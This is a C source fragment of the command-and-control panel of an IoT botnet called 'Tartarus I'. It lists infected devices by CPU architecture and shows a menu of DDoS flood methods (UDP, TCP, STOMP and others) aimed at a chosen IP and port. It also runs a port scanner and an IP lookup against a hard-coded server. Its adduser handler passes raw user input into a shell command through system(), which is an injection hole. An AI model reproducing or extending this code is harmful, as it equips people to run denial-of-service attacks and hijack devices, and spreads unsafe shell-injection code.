      sprintf(bot_2,    "\e[38;5;201m║ \e[38;5;202mTartarus I \e[38;5;201m- \e[38;5;202mDevice Listing \e[38;5;201m- \e[38;5;202mArch Detection \e[38;5;201m║\r\n");
      sprintf(bot_3,    "\e[38;5;201m╠════════════════════════════════════════════╣\r\n");
      sprintf(mips,     "\e[38;5;201m║ \e[38;5;202mMips Devices: \e[38;5;201m%d                            \e[38;5;201m║\r\n", mipsConnected());
      sprintf(arm,      "\e[38;5;201m║ \e[38;5;202mArm Devices: \e[38;5;201m%d                             \e[38;5;201m║\r\n", armConnected());
      sprintf(sh4,      "\e[38;5;201m║ \e[38;5;202mSh4 Devices: \e[38;5;201m%d                             \e[38;5;201m║\r\n", sh4Connected());
      sprintf(ppc,      "\e[38;5;201m║ \e[38;5;202mPpc Devices: \e[38;5;201m%d                             \e[38;5;201m║\r\n", ppcConnected());
      sprintf(x86,      "\e[38;5;201m║ \e[38;5;202mx86 Devices: \e[38;5;201m%d                             \e[38;5;201m║\r\n", x86Connected());
      sprintf(spc,      "\e[38;5;201m║ \e[38;5;202mSpc Devices: \e[38;5;201m%d                             \e[38;5;201m║\r\n", spcConnected());
      sprintf(total,    "\e[38;5;201m║ \e[38;5;202mTotal IoT Devices: \e[38;5;201m%d                       \e[38;5;201m║\r\n", clientsConnected());
      sprintf(bot_4,    "\e[38;5;201m╚════════════════════════════════════════════╝\r\n");
      if (send(thefd, bot_1, strlen(bot_1), MSG_NOSIGNAL) == -1) goto end;
      if (send(thefd, bot_2, strlen(bot_2), MSG_NOSIGNAL) == -1) goto end;
      if (send(thefd, bot_3, strlen(bot_3), MSG_NOSIGNAL) == -1) goto end;
      if (send(thefd, mips, strlen(mips), MSG_NOSIGNAL) == -1) goto end;
      if (send(thefd, sh4, strlen(sh4), MSG_NOSIGNAL) == -1) goto end;
      if (send(thefd, arm, strlen(arm), MSG_NOSIGNAL) == -1) goto end;
      if (send(thefd, ppc, strlen(ppc), MSG_NOSIGNAL) == -1) goto end;
      if (send(thefd, x86, strlen(x86), MSG_NOSIGNAL) == -1) goto end;
      if (send(thefd, spc, strlen(spc), MSG_NOSIGNAL) == -1) goto end;
      if (send(thefd, total, strlen(total), MSG_NOSIGNAL) == -1) goto end;
      if (send(thefd, bot_4, strlen(bot_4), MSG_NOSIGNAL) == -1) goto end;
      }
        else
      {
        sprintf(botnet, "\e[38;5;201m╔════════════════════════════════════════╗\r\n\e[38;5;201m║ \e[38;5;202mYou Do Not Have the needed Permissions \e[38;5;201m║\r\n\e[38;5;201m║      \e[38;5;202mTo View or use this command!      \e[38;5;201m║\r\n\e[38;5;201m╚═══════════════════════════════╦════════╝\r\n                                \e[38;5;201m║\r\n                                \e[38;5;201m║\r\n         \e[38;5;201m╔══════════════════════╩═══════════════════════════╗\r\n   \e[38;5;201m║  \e[38;5;93m:) \e[38;5;201m-  \e[38;5;202mOwO  \e[38;5;201m- \e[38;5;93mVexvain  \e[38;5;201m║\r\n         \e[38;5;201m╚══════════════════════════════════════════════════╝\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
      }
        }  
      if (strstr(buf, "resolve") || strstr(buf, "RESOLVE"))
      {
      char *ip[100];
      char *token = strtok(buf, " ");
      char *url = token+sizeof(token);
      trim(url);
      resolve(url, ip);
          sprintf(botnet, "\e[38;5;202mResolved \e[38;5;93m[\e[38;5;202m%s\e[38;5;93m] \e[38;5;202mto \e[38;5;93m[\e[38;5;202m%s\e[38;5;93m]\r\n", url, ip);
          if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
            if(strstr(buf, ".adduser") || strstr(buf, ".ADDUSER") || strstr(buf, "adduser") || strstr(buf, "ADDUSER"))
    {
      if(strcmp(admin, accounts[find_line].id) == 0)
      {
        char *token = strtok(buf, " ");
        char *userinfo = token+sizeof(token);
        trim(userinfo);
        char *uinfo[50];
        sprintf(uinfo, "echo '%s' >> tartarus.txt", userinfo);
        system(uinfo);
        printf("\e[38;5;93m[\e[38;5;202mTartarus\e[38;5;93m] \e[38;5;202mUser\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m] \e[38;5;202mAdded User\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m]\n", accounts[find_line].user, userinfo);
        sprintf(botnet, "\e[38;5;93m[\e[38;5;202mTartarus\e[38;5;93m] \e[38;5;202mUser\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m] \e[38;5;202mSuccessfully Added!\r\n", userinfo);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
      }
      else
      {
        sprintf(botnet, "Admins Only!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
      }
        }
        else if(strstr(buf, "PORTSCAN") || strstr(buf, "portscan"))
        {
            int x;
            int ps_timeout = 3;
            int least_port = 1;
            int max_port = 65535;
            char host[16];
            trim(buf);
            char *token = strtok(buf, " ");
            snprintf(host, sizeof(host), "%s", token+strlen(token)+1);
            snprintf(botnet, sizeof(botnet), "\e[38;5;93m[\e[38;5;202mTartarus\e[38;5;93m] \e[38;5;202mChecking ports \e[38;5;93m[\e[38;5;202m%d\e[38;5;93m] \e[38;5;202mthrough \e[38;5;93m[\e[38;5;202m%d\e[38;5;93m] \e[38;5;202mFor IP\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m]\x1b[0m\r\n", least_port, max_port, host);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            for(x=least_port; x < max_port; x++)
            {
                int Sock = -1;
                struct timeval timeout;
                struct sockaddr_in sock;
                // set timeout secs
                timeout.tv_sec = ps_timeout;
                timeout.tv_usec = 0;
                Sock = socket(AF_INET, SOCK_STREAM, 0); // create our tcp socket
                setsockopt(Sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
                setsockopt(Sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
                sock.sin_family = AF_INET;
                sock.sin_port = htons(x);
                sock.sin_addr.s_addr = inet_addr(host);
                if(connect(Sock, (struct sockaddr *)&sock, sizeof(sock)) == -1) close(Sock);
                else
                {
                    snprintf(botnet, sizeof(botnet), "\e[38;5;93m[\e[38;5;202mTartarus\e[38;5;93m] \e[38;5;202mPort\e[38;5;93m:[\e[38;5;202m%d\e[38;5;93m] \e[38;5;202mis open For IP\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m]\x1b[0m\r\n", x, host);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    memset(botnet, 0, sizeof(botnet));
                    close(Sock);
                }
            }
            snprintf(botnet, sizeof(botnet), "\e[38;5;93m[\e[38;5;202mTartarus\e[38;5;93m] \e[38;5;202mScan on IP\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m] \e[38;5;202mis Done!\x1b[0m\r\n", host);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, ".HELP") || strstr(buf, ".help") || strstr(buf, ".Help"))  
        {
        char help_cmd1 [5000];
        char help_cmd2 [5000];
        char help_cmd3 [5000];
        char help_cmd4 [5000];
        char help_cmd5 [5000];
        char help_cmd6 [5000];
        char help_cmd7 [5000];
        char help_cmd8 [5000];
        char help_cmd9 [5000];
        char help_cmd10 [5000];
        char help_cmd11 [5000];

        sprintf(help_cmd1, "           \e[38;5;201m╔══════════════════════════════════════════════╗\r\n");
        sprintf(help_cmd2, "           \e[38;5;201m║   \e[38;5;202mTartarus I \e[38;5;201m-\e[38;5;202m Main Command List\e[38;5;201m - \e[38;5;202mExtra Cmds  \e[38;5;201m║\r\n");
        sprintf(help_cmd3, "           \e[38;5;201m╠══════════════════════════════════════════════╣\r\n");
        sprintf(help_cmd4, "           \e[38;5;201m║ \e[38;5;202m.stress \e[38;5;201m- \e[38;5;202mShows a list of available methods  \e[38;5;201m║\r\n");
        sprintf(help_cmd5, "           \e[38;5;201m║ \e[38;5;202m.clear \e[38;5;201m- \e[38;5;202mClears the Screen                   \e[38;5;201m║\r\n");
        sprintf(help_cmd6, "           \e[38;5;201m║ \e[38;5;202m.logout \e[38;5;201m- \e[38;5;202mLogs out, and closes the C2        \e[38;5;201m║\r\n");
        sprintf(help_cmd7, "           \e[38;5;201m║ \e[38;5;202m.bots \e[38;5;201m- \e[38;5;202mShows a list of connected devices    \e[38;5;201m║\r\n");
        sprintf(help_cmd8, "           \e[38;5;201m║ \e[38;5;202m.info \e[38;5;201m- \e[38;5;202mShows a list of user information     \e[38;5;201m║\r\n");
        sprintf(help_cmd9, "           \e[38;5;201m║ \e[38;5;202m.tools \e[38;5;201m- \e[38;5;202mShows a list of available tools     \e[38;5;201m║\r\n");
        sprintf(help_cmd10, "           \e[38;5;201m║ \e[38;5;202m.staff \e[38;5;201m- \e[38;5;202mAdministrators only!                \e[38;5;201m║\r\n");
        sprintf(help_cmd11, "           \e[38;5;201m╚══════════════════════════════════════════════╝\r\n");

        if(send(thefd, help_cmd1, strlen(help_cmd1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_cmd2, strlen(help_cmd2),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_cmd3, strlen(help_cmd3),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_cmd4, strlen(help_cmd4),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_cmd5, strlen(help_cmd5),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_cmd6, strlen(help_cmd6),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_cmd7, strlen(help_cmd7),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_cmd8, strlen(help_cmd8),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_cmd9, strlen(help_cmd9),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_cmd10, strlen(help_cmd10),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_cmd11, strlen(help_cmd11),   MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(botnet, "\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m@\e[38;5;202mTartarus\e[38;5;93m]\e[38;5;154m$\e[38;5;202m ", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }
        continue;
        }
         if(strstr(buf, ".clear") || strstr(buf, ".CLEAR") || strstr(buf, "CLEAR") || strstr(buf, "clear")) 
        {
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tartarus_2, strlen(Tartarus_2), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Tartarus_3, strlen(Tartarus_3), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Tartarus_4, strlen(Tartarus_4), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Tartarus_5, strlen(Tartarus_5), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Tartarus_6, strlen(Tartarus_6), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Tartarus_7, strlen(Tartarus_7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tartarus_8, strlen(Tartarus_8), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tartarus_9, strlen(Tartarus_9), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tartarus_10, strlen(Tartarus_10), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tartarus_11, strlen(Tartarus_11), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tartarus_12, strlen(Tartarus_12), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tartarus_13, strlen(Tartarus_13), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tartarus_14, strlen(Tartarus_14), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tartarus_15, strlen(Tartarus_15), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tartarus_16, strlen(Tartarus_16), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tartarus_17, strlen(Tartarus_17), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tartarus_18, strlen(Tartarus_18), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tartarus_19, strlen(Tartarus_19), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Tartarus_20, strlen(Tartarus_20), MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(botnet, "\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m@\e[38;5;202mTartarus\e[38;5;93m]\e[38;5;154m$\e[38;5;202m ", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }
        continue;
        }
         if(strstr(buf, ".info") || strstr(buf, ".INFO"))  
        {
        char user_info1 [5000];
        char user_info2 [5000];
        char user_info3 [5000];
        char user_info4 [5000];
        char user_info5 [5000];
        char user_info6 [5000];
        char user_info7 [5000];
        char user_info8 [5000];
        char user_info9 [5000];
        char user_info10 [5000];
        char user_info11 [5000];
        char user_info12 [5000];
        char user_info13 [5000];
        char user_info14 [5000];
        char user_info15 [5000];

        sprintf(user_info1,  "   \e[38;5;201m╔═════════════════════════════╗\r\n");
        sprintf(user_info2,  "   \e[38;5;201m║ \e[38;5;202mTartarus I \e[38;5;201m- \e[38;5;202mUser Information \e[38;5;201m║     ╔═══════════════════╗\r\n");
        sprintf(user_info3,  "   \e[38;5;201m╠═════════════════════════════╣═══╗ ║\e[38;5;202m More Coming soon! \e[38;5;201m║\r\n");
        sprintf(user_info4,  "   \e[38;5;201m║ \e[38;5;202mUsername: \e[38;5;201m                \e[38;5;201m║   ║ ║      \e[38;5;202mSuch As      \e[38;5;201m║\r\n", accounts[find_line].user, buf);
        sprintf(user_info5,  "   \e[38;5;201m║ \e[38;5;202mPassword: \e[38;5;201m                \e[38;5;201m║   ╚═╬═══════════════════╣\r\n", accounts[find_line].password, buf);
        sprintf(user_info6,  "   \e[38;5;201m║ \e[38;5;202mUser Level: \e[38;5;201m              \e[38;5;201m║     ║ \e[38;5;202mUser IP:          \e[38;5;201m║\r\n", accounts[find_line].id, buf);
        sprintf(user_info8,  "   \e[38;5;201m╚═══════════╦═════════════════╝     ╚══════════════╦════╝\r\n");
        sprintf(user_info9,  "   \e[38;5;201m            ║                                      ║\r\n");
        sprintf(user_info10,  "   \e[38;5;201m            ║                                      ║\r\n");
        sprintf(user_info11,  "   \e[38;5;201m            ║                                      ║\r\n");
        sprintf(user_info12,  "   \e[38;5;201m   ╔════════╩══════════════════════════════════════╩═════════╗\r\n");
        sprintf(user_info13,  "   \e[38;5;201m   ║   \e[38;5;202m :)   \e[38;5;201m║\r\n");
        sprintf(user_info14,  "   \e[38;5;201m   ║     \e[38;5;93mVexvain \e[38;5;201m-                    ║  \r\n");
        sprintf(user_info15,  "   \e[38;5;201m   ╚═════════════════════════════════════════════════════════╝\r\n");

        if(send(thefd, user_info1, strlen(user_info1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, user_info2, strlen(user_info2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, user_info3, strlen(user_info3), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, user_info4, strlen(user_info4), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, user_info5, strlen(user_info5), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, user_info6, strlen(user_info6), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, user_info7, strlen(user_info7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, user_info8, strlen(user_info8), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, user_info9, strlen(user_info9), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, user_info10, strlen(user_info10), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, user_info11, strlen(user_info11), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, user_info12, strlen(user_info12), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, user_info13, strlen(user_info13), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, user_info14, strlen(user_info14), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, user_info15, strlen(user_info15), MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(botnet, "\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m@\e[38;5;202mTartarus\e[38;5;93m]\e[38;5;154m$\e[38;5;202m ", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }
        continue;
        }
        if(strstr(buf, ".STRESS") || strstr(buf, ".stress")) 
        {
        char method_1 [5000];
        char method_2 [5000];
        char method_3 [5000];
        char method_4 [5000];
        char method_5 [5000];
        char method_6 [5000];
        char method_7 [5000];
        char method_8 [5000];
        char method_9 [5000];
        char method_10 [5000];
        char method_11 [5000];
        char method_12 [5000];
        sprintf(method_1,  "            \e[38;5;201m╔═══════════════════════════════════════════════════════╗\r\n");
        sprintf(method_2,  "            \e[38;5;201m║ \e[38;5;202mTartarus I \e[38;5;201m- \e[38;5;202mDDoS Method Listing \e[38;5;201m- \e[38;5;202mAttack Method CmDs \e[38;5;201m  ║\r\n");
        sprintf(method_3,  "            \e[38;5;201m╠═══════════════════════════════════════════════════════╣\r\n");
        sprintf(method_4,  "            \e[38;5;201m║ \e[38;5;202m. STD \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m] \e[38;5;201m[\e[38;5;202mPORT\e[38;5;201m] \e[38;5;201m[\e[38;5;202mTIME\e[38;5;201m]                              \e[38;5;201m║\r\n");
        sprintf(method_5,  "            \e[38;5;201m║ \e[38;5;202m. UDP \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m] \e[38;5;201m[\e[38;5;202mPORT\e[38;5;201m] \e[38;5;201m[\e[38;5;202mTIME\e[38;5;201m]\e[38;5;202m 32 1460 10                   \e[38;5;201m║\r\n");
        sprintf(method_6,  "            \e[38;5;201m║ \e[38;5;202m. JUNK \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m] \e[38;5;201m[\e[38;5;202mPORT\e[38;5;201m] \e[38;5;201m[\e[38;5;202mTIME\e[38;5;201m]                             \e[38;5;201m║\r\n");
        sprintf(method_7,  "            \e[38;5;201m║ \e[38;5;202m. CRUSH \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m] \e[38;5;201m[\e[38;5;202mPORT\e[38;5;201m] \e[38;5;201m[\e[38;5;202mTIME\e[38;5;201m]\e[38;5;202m 32 ALL 1460 10             \e[38;5;201m║\r\n");
        sprintf(method_8,  "            \e[38;5;201m║ \e[38;5;202m. STOMP \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m] \e[38;5;201m[\e[38;5;202mPORT\e[38;5;201m] \e[38;5;201m[\e[38;5;202mTIME\e[38;5;201m]\e[38;5;202m 32 ALL 1460 10             \e[38;5;201m║\r\n");
        sprintf(method_9,  "            \e[38;5;201m║ \e[38;5;202m. TCP \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m] \e[38;5;201m[\e[38;5;202mPORT\e[38;5;201m] \e[38;5;201m[\e[38;5;202mTIME\e[38;5;201m]\e[38;5;202m 32 \e[38;5;201m(\e[38;5;202mFlags\e[38;5;201m/\e[38;5;202mALL\e[38;5;201m)\e[38;5;202m 0 10          \e[38;5;201m║\r\n");
        sprintf(method_10, "            \e[38;5;201m║ \e[38;5;202m. COMBO \e[38;5;201m[\e[38;5;202mIP\e[38;5;201m] \e[38;5;201m[\e[38;5;202mPORT\e[38;5;201m] \e[38;5;201m[\e[38;5;202mTIME\e[38;5;201m]                            \e[38;5;201m║\r\n");
        sprintf(method_11, "            \e[38;5;201m║ \e[38;5;202m. STOP \e[38;5;201m[\e[38;5;202mThis will stop your attack!\e[38;5;201m]                  \e[38;5;201m║\r\n");
        sprintf(method_12, "            \e[38;5;201m╚═══════════════════════════════════════════════════════╝\r\n");

        // crush, junk, stomp > taken out lynx
        if(send(thefd, method_1, strlen(method_1),    MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, method_2, strlen(method_2),    MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, method_3, strlen(method_3),    MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, method_4, strlen(method_4),    MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, method_5, strlen(method_5),    MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, method_6, strlen(method_6),    MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, method_7, strlen(method_7),    MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, method_8, strlen(method_8),    MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, method_9, strlen(method_9),    MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, method_10, strlen(method_10),    MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, method_11, strlen(method_11),    MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, method_12, strlen(method_12),  MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(botnet, "\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m@\e[38;5;202mTartarus\e[38;5;93m]\e[38;5;154m$\e[38;5;202m ", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }
        continue;
        }
        if(strstr(buf, ".staff") || strstr(buf, ".STAFF"))
        {
        pthread_create(&title, NULL, &titleWriter, sock);
        char staff_cmd1 [5000];
        char staff_cmd2 [5000];
        char staff_cmd3 [5000];
        char staff_cmd4 [5000];
        char staff_cmd5 [5000];
        char staff_cmd6 [5000];

        sprintf(staff_cmd1,   "              \e[38;5;201m╔═══════════════════════════════════════════════╗\r\n");
        sprintf(staff_cmd2,   "              \e[38;5;201m║    \e[38;5;202mTartarus I \e[38;5;201m- \e[38;5;202mAdmin commands \e[38;5;201m- \e[38;5;202mAdmin Tools    \e[38;5;201m║\r\n");
        sprintf(staff_cmd3,   "              \e[38;5;201m╠═══════════════════════════════════════════════╣\r\n");
        sprintf(staff_cmd4,   "              \e[38;5;201m║ \e[38;5;202m.adduser \e[38;5;201m[\e[38;5;202mUsername\e[38;5;201m] [\e[38;5;202mPassword\e[38;5;201m] [\e[38;5;202madmin\e[38;5;201m/\e[38;5;202mnormal\e[38;5;201m] \e[38;5;201m║\r\n");
        sprintf(staff_cmd5,   "              \e[38;5;201m║ \e[38;5;202m.bots \e[38;5;201m[\e[38;5;202mShows a list of connected devices\e[38;5;201m]     \e[38;5;201m║\r\n");
        sprintf(staff_cmd6,   "              \e[38;5;201m╚═══════════════════════════════════════════════╝\r\n");

        if(send(thefd, staff_cmd1, strlen(staff_cmd1),   MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, staff_cmd2, strlen(staff_cmd2),   MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, staff_cmd3, strlen(staff_cmd3),   MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, staff_cmd4, strlen(staff_cmd4),   MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, staff_cmd5, strlen(staff_cmd5),   MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, staff_cmd6, strlen(staff_cmd6),   MSG_NOSIGNAL) == -1) goto end; 
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        { 
        sprintf(botnet, "\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m@\e[38;5;202mTartarus\e[38;5;93m]\e[38;5;154m$\e[38;5;202m ", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break;
        }
        continue;
        } 
        if(strstr(buf, ".tools") || strstr(buf, ".TOOLS") || strstr(buf, ".tool") || strstr(buf, ".TOOL"))
        {
        pthread_create(&title, NULL, &titleWriter, sock);
        char tool1  [5000];
        char tool2  [5000];
        char tool3  [5000];
        char tool4  [5000];
        char tool5  [5000];
        char tool6  [5000];
        char tool7  [5000];
        sprintf(tool1, "              \e[38;5;201m╔═════════════════════════════════════╗\r\n");
        sprintf(tool2, "              \e[38;5;201m║  \e[38;5;202mTartarus I \e[38;5;201m- \e[38;5;202mUser Tools \e[38;5;201m- \e[38;5;202mTool CmDs  \e[38;5;201m║\r\n");
        sprintf(tool3, "              \e[38;5;201m╠═════════════════════════════════════╣\r\n");
        sprintf(tool4, "              \e[38;5;201m║ \e[38;5;202miplookup \e[38;5;201m[IP\e[38;5;201m] - \e[38;5;202mIP Geolocation      \e[38;5;201m║\r\n");
        sprintf(tool5, "              \e[38;5;201m║ \e[38;5;202mportscan \e[38;5;201m[IP\e[38;5;201m] - \e[38;5;202mPortScanner         \e[38;5;201m║\r\n");
        sprintf(tool6, "              \e[38;5;201m║ \e[38;5;202mresolve \e[38;5;201m[HOST\e[38;5;201m] - \e[38;5;202mHostname Resolver  \e[38;5;201m║\r\n");
        sprintf(tool7, "              \e[38;5;201m╚═════════════════════════════════════╝\r\n");
        if(send(thefd, tool1, strlen(tool1),   MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, tool2, strlen(tool2),   MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, tool3, strlen(tool3),   MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, tool4, strlen(tool4),   MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, tool5, strlen(tool5),   MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, tool6, strlen(tool6),   MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, tool7, strlen(tool7),   MSG_NOSIGNAL) == -1) goto end; 
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        { 
        sprintf(botnet, "\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m@\e[38;5;202mTartarus\e[38;5;93m]\e[38;5;154m$\e[38;5;202m ", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break;
        }
        continue;
        }
        else if(strstr(buf, "iplookup") || strstr(buf, "IPLOOKUP"))
        {
            char myhost[20];
            char ki11[1024];
            snprintf(ki11, sizeof(ki11), "%s", buf);
            trim(ki11);
            char *token = strtok(ki11, " ");
            snprintf(myhost, sizeof(myhost), "%s", token+strlen(token)+1);
            if(atoi(myhost) >= 8)
            {
                int ret;
                int IPLSock = -1;
                char iplbuffer[1024];
                int conn_port = 80;
                char iplheaders[1024];
                struct timeval timeout;
                struct sockaddr_in sock;
                char *iplookup_host = "23.254.244.244"; // Change to Server IP
                timeout.tv_sec = 4; // 4 second timeout
                timeout.tv_usec = 0;
                IPLSock = socket(AF_INET, SOCK_STREAM, 0);
                sock.sin_family = AF_INET;
                sock.sin_port = htons(conn_port);
                sock.sin_addr.s_addr = inet_addr(iplookup_host);
                if(connect(IPLSock, (struct sockaddr *)&sock, sizeof(sock)) == -1)
                {
                    //printf("[\x1b[31m-\x1b[37m] Failed to connect to iplookup host server...\n");
                    sprintf(botnet, "\x1b[31m[IPLookup] Failed to connect to iplookup server...\x1b[0m\r\n", myhost);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                else
                {
                    //printf("[\x1b[32m+\x1b[37m] Connected to iplookup server :)\n");
                    snprintf(iplheaders, sizeof(iplheaders), "GET /iplookup.php?host=%s HTTP/1.1\r\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding:gzip, deflate, sdch\r\nAccept-Language:en-US,en;q=0.8\r\nCache-Control:max-age=0\r\nConnection:keep-alive\r\nHost:%s\r\nUpgrade-Insecure-Requests:1\r\nUser-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36\r\n\r\n", myhost, iplookup_host);
                    if(send(IPLSock, iplheaders, strlen(iplheaders), 0))
                    {
                        //printf("[\x1b[32m+\x1b[37m] Sent request headers to iplookup api!\n");
                        sprintf(botnet, "\e[38;5;93m[\e[38;5;202mTartarus\e[38;5;93m] \e[38;5;202mGathering Information On IP:\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m]\r\n", myhost);
                        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                        char ch;
                        int retrv = 0;
                        uint32_t header_parser = 0;
                        while (header_parser != 0x0D0A0D0A)
                        {
                            if ((retrv = read(IPLSock, &ch, 1)) != 1)
                                break;
                
                            header_parser = (header_parser << 8) | ch;
                        }
                        memset(iplbuffer, 0, sizeof(iplbuffer));
                        while(ret = read(IPLSock, iplbuffer, 1024))
                        {
                            iplbuffer[ret] = '\0';
                            /*if(strlen(iplbuffer) > 1)
                                printf("\x1b[36m%s\x1b[37m\n", buffer);*/
                        }
                        //printf("%s\n", iplbuffer);
                        if(strstr(iplbuffer, "<title>404"))
                        {
                            char iplookup_host_token[20];
                            sprintf(iplookup_host_token, "%s", iplookup_host);
                            int ip_prefix = atoi(strtok(iplookup_host_token, "."));
                            sprintf(botnet, "\x1b[31m[IPLookup] Failed, API can't be located on server %d.*.*.*:80\x1b[0m\r\n", ip_prefix);
